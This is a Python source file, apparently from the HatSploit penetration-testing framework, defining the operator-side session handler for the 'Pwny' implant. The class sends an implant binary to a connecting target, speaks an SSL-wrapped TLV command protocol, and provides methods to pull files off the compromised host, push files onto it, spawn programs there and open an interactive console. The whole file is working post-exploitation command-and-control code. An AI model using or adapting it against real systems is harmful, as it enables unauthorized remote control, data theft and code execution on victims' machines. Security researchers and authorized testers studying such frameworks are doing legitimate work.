"""
MIT License

Copyright (c) 2020-2024 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import socket

from alive_progress import alive_bar

from badges import Badges
from typing import Optional

from pwny import Pwny

from pwny.types import *
from pwny.api import *

from pwny.tlv import TLV
from pwny.pipes import Pipes
from pwny.spawn import Spawn
from pwny.console import Console

from pex.fs import FS
from pex.ssl import OpenSSL
from pex.proto.tlv import TLVClient, TLVPacket

from hatsploit.lib.session import Session


class PwnySession(Pwny, Session, Console):
    """ Subclass of pwny module.

    This subclass of pwny module represents an implementation
    of the Pwny session for HatSploit Framework.
    """

    def __init__(self) -> None:
        super().__init__()

        self.channel = None
        self.uuid = None
        self.terminated = False

        self.pipes = Pipes(self)

        self.badges = Badges()
        self.fs = FS()
        self.ssl = OpenSSL()

        self.details.update(
            {
                'Type': "pwny"
            }
        )

    def open(self, client: socket.socket, loader: bool = True) -> None:
        """ Open the Pwny session.

        :param socket.socket client: client to open session with
        :param bool loader: True if executed from loader else False
        :return None: None
        :raises RuntimeError: with trailing error message
        """

        if loader:
            client.send(self.get_implant(
                platform=self.details['Platform'],
                arch=self.details['Arch']
            ))

        client = self.ssl.wrap_client(client)
        self.channel = TLV(TLVClient(client))

        tlv = self.channel.read()
        self.uuid = tlv.get_string(TLV_TYPE_UUID)

        if self.uuid:
            self.start_pwny(self)
            return

        raise RuntimeError("No UUID received or UUID broken!")

    def close(self) -> None:
        """ Close the Pwny session.

        :return None: None
        """

        self.channel.client.close()
        self.terminated = True

    def heartbeat(self) -> bool:
        """ Check the Pwny session heartbeat.

        :return bool: True if the Pwny session is alive
        """

        return not self.terminated

    def send_command(self, tag: int, args: dict = {}, plugin: Optional[int] = None) -> TLVPacket:
        """ Send command to the Pwny session.

        :param int tag: tag
        :param dict args: command arguments with their types
        :param Optional[int] plugin: plugin ID if tag is presented within the plugin
        :return TLVPacket: packets
        """

        tlv = TLVPacket()

        if plugin is not None:
            tlv.add_int(TLV_TYPE_TAB_ID, plugin)

        tlv.add_int(TLV_TYPE_TAG, tag)
        tlv.add_from_dict(args)

        self.channel.send(tlv)
        return self.channel.read(error=True)

    def download(self, remote_file: str, local_path: str) -> bool:
        """ Download file from the Pwny session.

        :param str remote_file: file to download
        :param str local_path: path to save downloaded file to
        :return bool: True if download succeed
        """

        exists, is_dir = self.fs.exists(local_path)

        if exists:
            if is_dir:
                local_path = os.path.abspath(
                    '/'.join((local_path, os.path.split(remote_file)[1])))

            try:
                pipe_id = self.pipes.create_pipe(
                    pipe_type=FS_PIPE_FILE,
                    args={
                        TLV_TYPE_FILENAME: remote_file,
                        FS_TYPE_MODE: 'rb',
                    }
                )

            except RuntimeError:
                self.badges.print_error(f"Remote file: {remote_file}: does not exist!")
                return False

            self.pipes.seek_pipe(FS_PIPE_FILE, pipe_id, 0, 2)
            size = self.pipes.tell_pipe(FS_PIPE_FILE, pipe_id)
            self.pipes.seek_pipe(FS_PIPE_FILE, pipe_id, 0, 0)

            with open(local_path, 'wb') as f:
                with alive_bar(int(size / TLV_FILE_CHUNK) + 1, receipt=False,
                               ctrl_c=False, monitor="{percent:.0%}", stats=False,
                               title=os.path.split(remote_file)[1]) as bar:
                    while size > 0:
                        bar()

                        chunk = min(TLV_FILE_CHUNK, size)
                        buffer = self.pipes.read_pipe(FS_PIPE_FILE, pipe_id, chunk)
                        f.write(buffer)
                        size -= chunk

            self.pipes.destroy_pipe(FS_PIPE_FILE, pipe_id)

            return True

        self.fs.check_file(local_path)
        return False

    def upload(self, local_file: str, remote_path: str) -> bool:
        """ Upload file to the Pwny session.

        :param str local_file: file to upload
        :param str remote_path: path to save uploaded file to
        :return bool: True if upload succeed
        """

        self.fs.check_file(local_file)

        with open(local_file, 'rb') as f:
            buffer = f.read()
            size = len(buffer)

            pipe_id = self.pipes.create_pipe(
                pipe_type=FS_PIPE_FILE,
                args={
                    TLV_TYPE_FILENAME: remote_path,
                    FS_TYPE_MODE: 'wb',
                }
            )

            with alive_bar(int(size / TLV_FILE_CHUNK) + 1, receipt=False,
                           ctrl_c=False, monitor="{percent:.0%}", stats=False,
                           title=os.path.split(local_file)[1]) as bar:
                for step in range(0, size, TLV_FILE_CHUNK):
                    bar()

                    chunk = buffer[step:step + TLV_FILE_CHUNK]
                    self.pipes.write_pipe(FS_PIPE_FILE, pipe_id, chunk)

            self.pipes.destroy_pipe(FS_PIPE_FILE, pipe_id)

            return True

    def spawn(self, path: str, args: list = []) -> bool:
        """ Execute path.

        :param str path: path to execute
        :param list args: command-line arguments
        :return bool: True if success else False
        """

        return Spawn(self).spawn(path, args)

    def interact(self) -> None:
        """ Interact with the Pwny session.

        :return None: None
        """

        self.pwny_console()
